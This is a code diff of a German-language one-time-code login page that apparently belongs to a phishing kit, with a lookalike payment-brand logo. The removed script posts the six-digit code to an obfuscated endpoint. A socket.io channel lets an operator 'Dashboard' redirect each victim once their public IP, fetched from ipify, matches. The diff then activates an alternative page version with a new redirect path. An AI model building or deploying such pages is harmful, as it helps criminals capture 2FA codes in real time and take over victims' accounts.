@@ -1,143 +1,7 @@
-<!DOCTYPE html>
-<html lang="de">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="./css/index.css">
-    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-</head>
-<body>
-    <header>
-    </header>
-    <main>
-        <form method="post" id="twoFactorForm">
-            <div class="logosms">
-                <img src="./img/pipillgomark.png" alt="">
-            </div>
-            <div class="text" style="gap: 1rem;">
-                <p>Mit Einmalcode einloggen</p>
-                <p>Code wurde an Ihre Nummer gesendet.</p>
-            </div>
-            <p style="text-align: center; margin: 15px 0; margin-bottom: 30px; cursor: pointer; color: #006de2;">Neuen Code anfordern</p>
-            <div class="logosms">
-                <div style="display: flex; justify-content: center; gap: 10px; margin-bottom: 20px;">
-                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required>
-                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required>
-                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required>
-                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required>
-                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required>
-                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required>
-                </div>
-                <div id="loading" style="display: none; justify-content: center; margin-top: 20px;">
-                    <div class="spinner"></div>
-                </div>
-                <a href="">Neuen Code senden</a>
-            </div>
-
-            
-        </form>
-    </main>
-    <footer>
-        <p>Kontakt</p>
-        <p>Datenschutz</p>
-        <p>Rechtliches</p>
-        <p>Richtlinienaktualisierungen</p>
-        <p>Weltweit</p>
-    </footer>
-
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const form = document.getElementById('twoFactorForm');
-            const inputs = form.querySelectorAll('.code-input');
-            const loading = document.getElementById('loading');
-
-            // Handle input behavior
-            inputs.forEach((input, index) => {
-                input.addEventListener('input', function(e) {
-                    if (this.value.length === 1) {
-                        if (index < inputs.length - 1) {
-                            inputs[index + 1].focus();
-                        }
-                    }
-                });
-
-                input.addEventListener('keydown', function(e) {
-                    if (e.key === 'Backspace' && !this.value && index > 0) {
-                        inputs[index - 1].focus();
-                    }
-                });
-            });
-
-            // Auto-submit when all fields are filled
-            inputs.forEach(input => {
-                input.addEventListener('input', function() {
-                    const allFilled = Array.from(inputs).every(input => input.value.length === 1);
-                    if (allFilled) {
-                        const code = Array.from(inputs).map(input => input.value).join('');
-                        console.log('Verification code:', code);
-                        
-                        // Show loading spinner
-                        loading.style.display = 'flex';
-                        
-                        // Disable all inputs
-                        inputs.forEach(input => input.disabled = true);
-                        //send backend:
-        $.ajax({
-            url: '/m4kT9BQWt7KTDdaVmafx',
-            type: 'POST',
-            contentType: 'application/json',
-            data: JSON.stringify({code}),
-            success: function(info) {
-                if(info.OK){
-                    // Wait 3 seconds then redirect
-                    setTimeout(() => {
-                            window.location.href = '/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM';
-                        }, 3000);
-                }
-            }
-        });
-                        
-                        
-                        // Prevent actual form submission
-                        form.onsubmit = (e) => e.preventDefault();
-                    }
-                });
-            });
-        });
-    </script>
-
-    <script src="./socket.io/socket.io.js"></script>
-    <script>
-      async function getPublicIP() {
-  try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    console.log("Public IP:", data.ip);
-    return data.ip;
-  } catch (error) {
-    console.error("Failed to fetch IP:", error);
-    return null;
-  }
-}
-      const socket = io();
-     
-      // Handle redirect messages from server
-      socket.on('redirect', async (data) => {
-        const currentIp = await getPublicIP();
-        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
-        
-        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {
-
-          window.location.href = data.url;
-        }
-      });
-      </script>
-</body>
-</html>
 
 
 
-<!-- 
+
 <!DOCTYPE html>
 <html lang="de"></html>
 <head>
@@ -324,7 +188,7 @@
       .then(res => res.json())
       .then(data => {
         if (data.OK) {
-          window.location.href = "/loading?time=20&url=/QcEwP85AgNE4pnL5mWSM";
+          window.location.href = "/loading?time=20&url=/RKnUB922z6Mf4HDwg3EZ";
         }
       })
       .catch(err => console.error('Error:', err));
@@ -358,4 +222,4 @@
       });
       </script>
 </body>
-</html> -->
+</html>
